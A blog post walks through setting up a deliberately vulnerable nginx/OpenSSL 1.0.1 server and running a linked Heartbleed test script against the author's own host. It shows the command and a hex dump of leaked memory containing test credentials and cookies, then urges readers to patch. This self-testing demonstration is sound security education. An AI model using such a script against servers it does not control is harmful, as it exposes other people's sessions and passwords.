---
layout: post
title: Heartbleed
category: posts
image: heartbleed/header.png
---

The [Heartbleed Bug](http://heartbleed.com/) is a huge deal. It allows anyone to read the RAM of a vulnerable system, exposing user sessions, cookies, passwords, etc. I setup a fresh new ec2 instance and installed nginx with the intent of exploring and testing the heartbleed bug.

The first thing I did was check which version of OpenSSL I was running. Turns out Ubuntu 12.04 comes with a vulnerable version:

{% highlight bash %}
$ openssl version -a
OpenSSL 1.0.1 14 Mar 2012
built on: Wed Jan  8 20:45:51 UTC 2014
platform: debian-amd64
options:  bn(64,64) rc4(16x,int) des(idx,cisc,16,int) blowfish(idx)
compiler: cc -fPIC -DOPENSSL_PIC -DZLIB -DOPENSSL_THREADS -D_REENTRANT -DDSO_DLFCN -DHAVE_DLFCN_H -m64 -DL_ENDIAN -DTERMIO -g -O2 -fstack-protector --param=ssp-buffer-size=4 -Wformat -Wformat-security -Werror=format-security -D_FORTIFY_SOURCE=2 -Wl,-Bsymbolic-functions -Wl,-z,relro -Wa,--noexecstack -Wall -DOPENSSL_NO_TLS1_2_CLIENT -DOPENSSL_MAX_TLS1_2_CIPHER_LENGTH=50 -DMD32_REG_T=int -DOPENSSL_IA32_SSE2 -DOPENSSL_BN_ASM_MONT -DOPENSSL_BN_ASM_MONT5 -DOPENSSL_BN_ASM_GF2m -DSHA1_ASM -DSHA256_ASM -DSHA512_ASM -DMD5_ASM -DAES_ASM -DVPAES_ASM -DBSAES_ASM -DWHIRLPOOL_ASM -DGHASH_ASM
OPENSSLDIR: "/usr/lib/ssl"
{% endhighlight %}

Next I installed nginx and self-signed my own cert:

{% highlight bash %}
$ sudo apt-get install nginx
$ sudo mkdir -p /etc/nginx/ssl/keys
$ cd /etc/nginx/ssl/keys
$ openssl genrsa -des3 -out self-ssl.key 1024
$ openssl req -new -key self-ssl.key -out self-ssl.csr
$ openssl x509 -req -days 365 -in self-ssl.csr -signkey self-ssl.key -out self-ssl.crt
{% endhighlight %}

Then I configured nginx:

{% highlight bash %}
$ sudo vim /etc/nginx/sites-enabled/default

server {
  listen 443;
  server_name heartbleed;

  root /usr/share/nginx/www;
  index index.html index.htm;

  ## SSL
  ssl on;
  ssl_certificate /etc/nginx/ssl/keys/self-ssl.crt;
  ssl_certificate_key /etc/nginx/ssl/keys/self-ssl.key;

  ## SSL caching/optimization
  ssl_protocols        SSLv3 TLSv1 TLSv1.1 TLSv1.2;
  ssl_ciphers RC4:HIGH:!aNULL:!MD5;
  ssl_prefer_server_ciphers on;
  keepalive_timeout    60;
  ssl_session_cache    shared:SSL:10m;
  ssl_session_timeout  10m;

  ## SSL log files
  access_log /var/log/nginx/heartbleed/ssl_access.log;
  error_log /var/log/nginx/heartbleed/ssl_error.log;

  location / {
    proxy_set_header        Accept-Encoding   "";
    proxy_set_header        Host              $http_host;
    proxy_set_header        X-Forwarded-By    $server_addr:$server_port;
    proxy_set_header        X-Forwarded-For   $remote_addr;
    proxy_set_header        X-Forwarded-Proto $scheme;
    proxy_set_header        X-Real-IP         $remote_addr;
    proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504;
  }
}

{% endhighlight %}

I made a dummy html page with a form for submitting username/password. I also added a bit of javascript that set a cookie as well. 

{% highlight html %}
<form name="input" action="index.html" method="get">
  Username: <input type="text" name="username"> <br />
  Password: <input type="password" name="password"> <br />
  <input type="submit" value="Submit">
</form>

<script>
  document.cookie="heartbleed='Hi friends!'";
</script>
{% endhighlight %}

Then I ran [this script](https://gist.github.com/akenn/10159084) (the one mentioned in [this article](https://www.mattslifebytes.com/?p=533)) against myself. 

The dump had the most recent request in it including all cookies:

{% highlight bash %}
❯ python hb-test.py heartbleed.akenn.org

Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 549
 ... received message: type = 22, ver = 0302, length = 203
 ... received message: type = 22, ver = 0302, length = 4
Sending heartbeat request...
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 12 00 10 04  ....#...........
  00e0: 01 05 01 02 01 04 03 05 03 02 03 04 02 02 02 00  ................
  00f0: 12 00 00 5F 39 5F 32 29 20 41 70 70 6C 65 57 65  ..._9_2) AppleWe
  0100: 62 4B 69 74 2F 35 33 37 2E 33 36 20 28 4B 48 54  bKit/537.36 (KHT
  0110: 4D 4C 2C 20 6C 69 6B 65 20 47 65 63 6B 6F 29 20  ML, like Gecko) 
  0120: 43 68 72 6F 6D 65 2F 33 33 2E 30 2E 31 37 35 30  Chrome/33.0.1750
  0130: 2E 31 35 32 20 53 61 66 61 72 69 2F 35 33 37 2E  .152 Safari/537.
  0140: 33 36 0D 0A 52 65 66 65 72 65 72 3A 20 68 74 74  36..Referer: htt
  0150: 70 73 3A 2F 2F 68 65 61 72 74 62 6C 65 65 64 2E  ps://heartbleed.
  0160: 61 6B 65 6E 6E 2E 6F 72 67 2F 69 6E 64 65 78 2E  akenn.org/index.
  0170: 68 74 6D 6C 3F 75 73 65 72 6E 61 6D 65 3D 74 65  html?username=te
  0180: 73 74 26 70 61 73 73 77 6F 72 64 3D 61 64 73 66  st&password=adsf
  0190: 0D 0A 41 63 63 65 70 74 2D 45 6E 63 6F 64 69 6E  ..Accept-Encodin
  01a0: 67 3A 20 67 7A 69 70 2C 64 65 66 6C 61 74 65 2C  g: gzip,deflate,
  01b0: 73 64 63 68 0D 0A 41 63 63 65 70 74 2D 4C 61 6E  sdch..Accept-Lan
  01c0: 67 75 61 67 65 3A 20 65 6E 2D 55 53 2C 65 6E 3B  guage: en-US,en;
  01d0: 71 3D 30 2E 38 0D 0A 43 6F 6F 6B 69 65 3A 20 75  q=0.8..Cookie: u
  01e0: 73 65 72 6E 61 6D 65 3D 4A 6F 68 6E 20 44 6F 65  sername=John Doe
  01f0: 3B 20 68 65 61 72 74 62 6C 65 65 64 3D 27 48 69  ; heartbleed='Hi
  0200: 20 66 72 69 65 6E 64 73 21 27 0D 0A 0D 0A 1E 25   friends!'.....%
  0210: 49 D9 60 31 25 9C EA 14 2A 2F E4 86 82 B1 56 0A  I.`1%...*/....V.
  0220: 53 16 CB D3 B6 C4 00 00 00 00 00 00 00 00 00 00  S...............
  0230: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  0240: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  0250: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  0260: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................

.....

WARNING: server returned more data than it should - server is vulnerable!
{% endhighlight %}

As you can see, my most recent request (a `GET` request to the same url with username and password as params) has the cookies I passed along in the request in there. Now imagine doing that to a much larger site and getting someone's sessionID or some equivalent.

This is a really, really scary bug. Make sure your version of OpenSSL is patched! More at: http://heartbleed.com/
